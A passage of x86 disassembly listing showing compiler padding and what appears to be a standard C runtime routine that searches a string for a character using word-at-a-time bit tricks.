  428b55:	int3   
  428b56:	int3   
  428b57:	int3   
  428b58:	int3   
  428b59:	int3   
  428b5a:	int3   
  428b5b:	int3   
  428b5c:	int3   
  428b5d:	int3   
  428b5e:	int3   
  428b5f:	int3   
  428b60:	lea    eax,[edx-0x1]
  428b63:	pop    ebx
  428b64:	ret    
  428b65:	lea    esp,[esp+0x0]
  428b6c:	lea    esp,[esp+0x0]
  428b70:	xor    eax,eax
  428b72:	mov    al,BYTE PTR [esp+0x8]
  428b76:	push   ebx
  428b77:	mov    ebx,eax
  428b79:	shl    eax,0x8
  428b7c:	mov    edx,DWORD PTR [esp+0x8]
  428b80:	test   edx,0x3
  428b86:	je     0x428b9d
  428b88:	mov    cl,BYTE PTR [edx]
  428b8a:	add    edx,0x1
  428b8d:	cmp    cl,bl
  428b8f:	je     0x428b60
  428b91:	test   cl,cl
  428b93:	je     0x428be6
  428b95:	test   edx,0x3
  428b9b:	jne    0x428b88
  428b9d:	or     ebx,eax
  428b9f:	push   edi
  428ba0:	mov    eax,ebx
  428ba2:	shl    ebx,0x10
  428ba5:	push   esi
  428ba6:	or     ebx,eax
  428ba8:	mov    ecx,DWORD PTR [edx]
  428baa:	mov    edi,0x7efefeff
  428baf:	mov    eax,ecx
  428bb1:	mov    esi,edi
  428bb3:	xor    ecx,ebx
  428bb5:	add    esi,eax
  428bb7:	add    edi,ecx
  428bb9:	xor    ecx,0xffffffff
  428bbc:	xor    eax,0xffffffff
  428bbf:	xor    ecx,edi
  428bc1:	xor    eax,esi
  428bc3:	add    edx,0x4
  428bc6:	and    ecx,0x81010100
  428bcc:	jne    0x428bea
  428bce:	and    eax,0x81010100
  428bd3:	je     0x428ba8
  428bd5:	and    eax,0x1010100
  428bda:	jne    0x428be4
  428bdc:	and    esi,0x80000000
  428be2:	jne    0x428ba8
  428be4:	pop    esi
  428be5:	pop    edi
  428be6:	pop    ebx
  428be7:	xor    eax,eax
  428be9:	ret    
  428bea:	mov    eax,DWORD PTR [edx-0x4]
  428bed:	cmp    al,bl
  428bef:	je     0x428c27
  428bf1:	test   al,al
  428bf3:	je     0x428be4
  428bf5:	cmp    ah,bl
  428bf7:	je     0x428c20
  428bf9:	test   ah,ah
  428bfb:	je     0x428be4
  428bfd:	shr    eax,0x10
  428c00:	cmp    al,bl
  428c02:	je     0x428c19
  428c04:	test   al,al
  428c06:	je     0x428be4
  428c08:	cmp    ah,bl
  428c0a:	je     0x428c12
  428c0c:	test   ah,ah
  428c0e:	je     0x428be4
  428c10:	jmp    0x428ba8
  428c12:	pop    esi
  428c13:	pop    edi
  428c14:	lea    eax,[edx-0x1]
  428c17:	pop    ebx
  428c18:	ret    
  428c19:	lea    eax,[edx-0x2]
  428c1c:	pop    esi
  428c1d:	pop    edi
  428c1e:	pop    ebx
  428c1f:	ret    
  428c20:	lea    eax,[edx-0x3]
  428c23:	pop    esi
  428c24:	pop    edi
  428c25:	pop    ebx
  428c26:	ret    
  428c27:	lea    eax,[edx-0x4]
  428c2a:	pop    esi
  428c2b:	pop    edi
  428c2c:	pop    ebx
  428c2d:	ret    
  428c2e:	jmp    DWORD PTR ds:0x429104
